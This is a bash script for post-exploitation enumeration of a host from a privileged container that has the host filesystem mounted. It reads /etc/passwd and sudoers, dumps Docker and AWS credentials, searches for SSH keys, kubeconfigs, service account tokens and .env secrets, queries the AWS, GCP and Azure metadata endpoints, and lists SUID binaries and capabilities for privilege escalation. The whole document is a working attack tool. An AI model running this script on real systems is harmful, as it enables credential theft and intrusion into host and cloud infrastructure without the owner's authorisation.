#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  COMPREHENSIVE HOST SYSTEM ENUMERATION  "
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | head -10
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null
chroot /host cat /etc/hostname 2>/dev/null
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null
echo ""

echo "[*] CPU Information:"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor|cpu cores)" | head -5
echo ""

echo "[*] Memory Information:"
chroot /host free -h 2>/dev/null
echo ""

echo "=== 2. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
chroot /host ip addr show 2>/dev/null || chroot /host ifconfig 2>/dev/null || cat /host/proc/net/dev 2>/dev/null
echo ""

echo "[*] Routing Table:"
chroot /host ip route 2>/dev/null || chroot /host route -n 2>/dev/null || cat /host/proc/net/route 2>/dev/null
echo ""

echo "[*] ARP Table:"
cat /host/proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening Ports (from /proc/net/tcp):"
cat /host/proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "[*] DNS Configuration:"
chroot /host cat /etc/resolv.conf 2>/dev/null
echo ""

echo "=== 3. USERS AND GROUPS ==="
echo "[*] /etc/passwd:"
chroot /host cat /etc/passwd 2>/dev/null
echo ""

echo "[*] /etc/group:"
chroot /host cat /etc/group 2>/dev/null | head -30
echo ""

echo "[*] Users with shell access:"
chroot /host grep -E "/bin/(bash|sh|zsh)" /etc/passwd 2>/dev/null
echo ""

echo "[*] Sudoers configuration:"
chroot /host cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20
echo ""

echo "=== 4. RUNNING PROCESSES ==="
echo "[*] Process list (top 20):"
chroot /host ps aux 2>/dev/null | head -20 || cat /host/proc/*/stat 2>/dev/null | head -5
echo ""

echo "[*] Systemd services:"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -30
echo ""

echo "=== 5. DOCKER/KUBERNETES ==="
echo "[*] Docker socket:"
ls -la /host/var/run/docker.sock 2>/dev/null || echo "  Not found"
ls -la /host/run/docker.sock 2>/dev/null || echo "  Not found (alt location)"
echo ""

echo "[*] Containerd socket:"
ls -la /host/var/run/containerd/containerd.sock 2>/dev/null || echo "  Not found"
ls -la /host/run/containerd/containerd.sock 2>/dev/null || echo "  Not found (alt location)"
echo ""

echo "[*] Kubernetes components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "[*] Kubernetes service account (if in pod):"
cat /host/var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50 && echo "..." || echo "  Not found"
cat /host/var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "  Namespace not found"
echo ""

echo "=== 6. CREDENTIALS AND SECRETS ==="
echo "[*] SSH keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root SSH keys"
find /host/home -name ".ssh" -type d 2>/dev/null | head -5
echo ""

echo "[*] Docker credentials:"
chroot /host cat /root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "[*] Kubernetes configs:"
find /host -name "kubeconfig" 2>/dev/null | head -5
find /host -path "*/.kube/config" 2>/dev/null | head -5
find /host -path "*/serviceaccount/token" 2>/dev/null | head -5
echo ""

echo "[*] AWS credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
chroot /host cat /root/.aws/credentials 2>/dev/null | head -10 || echo "  No AWS credentials"
echo ""

echo "[*] Environment files with secrets:"
find /host -name ".env" -type f 2>/dev/null | head -10
grep -r "password\|secret\|key\|token" /host/etc 2>/dev/null | grep -v binary | head -10
echo ""

echo "=== 7. SCHEDULED TASKS ==="
echo "[*] Crontab:"
chroot /host cat /etc/crontab 2>/dev/null
chroot /host crontab -l 2>/dev/null || echo "  No user crontab"
find /host/var/spool/cron 2>/dev/null | head -10
echo ""

echo "[*] Systemd timers:"
chroot /host systemctl list-timers 2>/dev/null | head -20
echo ""

echo "=== 8. INSTALLED SOFTWARE ==="
echo "[*] Package manager (Debian/Ubuntu):"
chroot /host dpkg -l 2>/dev/null | head -30 || echo "  Not Debian-based"
echo ""

echo "[*] Package manager (RHEL/CentOS):"
chroot /host rpm -qa 2>/dev/null | head -30 || echo "  Not RHEL-based"
echo ""

echo "[*] Python packages:"
chroot /host pip list 2>/dev/null | head -20 || echo "  pip not available"
echo ""

echo "=== 9. FILE SYSTEM ==="
echo "[*] Mounted filesystems:"
chroot /host df -h 2>/dev/null | head -20
cat /host/proc/mounts 2>/dev/null | head -20
echo ""

echo "[*] Disk usage:"
chroot /host du -sh /host/* 2>/dev/null | sort -h | tail -10
echo ""

echo "[*] Writable directories:"
find /host/tmp -writable -type d 2>/dev/null | head -5
find /host/var/tmp -writable -type d 2>/dev/null | head -5
echo ""

echo "=== 10. LOG FILES ==="
echo "[*] Recent system logs:"
chroot /host tail -20 /var/log/syslog 2>/dev/null || chroot /host tail -20 /var/log/messages 2>/dev/null || echo "  Logs not accessible"
echo ""

echo "[*] Auth logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || chroot /host tail -20 /var/log/secure 2>/dev/null || echo "  Auth logs not accessible"
echo ""

echo "=== 11. CLOUD METADATA ==="
echo "[*] AWS metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -10 || echo "  Not AWS"
echo ""

echo "[*] GCP metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -10 || echo "  Not GCP"
echo ""

echo "[*] Azure metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -10 || echo "  Not Azure"
echo ""

echo "=== 12. SECURITY ==="
echo "[*] SUID binaries:"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] SGID binaries:"
find /host -perm -2000 -type f 2>/dev/null | head -20
echo ""

echo "[*] World-writable files:"
find /host -perm -002 -type f 2>/dev/null | head -20
echo ""

echo "[*] Capabilities:"
chroot /host getcap -r / 2>/dev/null | head -20 || echo "  getcap not available"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
